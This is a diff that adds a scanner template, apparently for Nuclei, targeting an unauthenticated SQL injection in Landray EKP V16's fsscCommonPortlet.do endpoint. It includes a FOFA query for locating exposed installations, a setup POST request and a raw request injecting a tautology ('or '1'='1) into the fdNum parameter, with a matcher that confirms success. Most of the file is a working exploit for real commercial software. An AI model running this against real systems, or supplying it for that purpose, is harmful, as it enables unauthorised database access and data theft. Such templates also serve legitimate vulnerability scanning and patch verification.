@@ -1,0 +1,42 @@
+id: landray-ekp-v16-fssccommonportlet-sql
+
+info:
+  name: 蓝凌EKP V16 fsscCommonPortlet.do SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Landray-OA系统"
+          受影响版本：V16.0.6.R.20220727，漏洞位于路径 /fssc/common/fssc_common_portlet/fsscCommonPortlet.do，对应处理类为 FsscCommonPortletAction。该类的 getICareByFdId 方法在参数处理过程中存在 SQL 注入缺陷，攻击者可通过构造恶意请求在未经身份验证的情况下执行任意 SQL 语句。利用链需先触发数据库写入操作以建立攻击上下文。
+
+      POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
+      Pragma: no-cache
+      Cache-Control: no-cache
+      Accept: */*
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+
+      method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=1&createTime=1&fdStatus=1
+  tags: 蓝凌EKP
+
+http:
+- raw:
+  - |
+    POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+
+    method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'fdName'
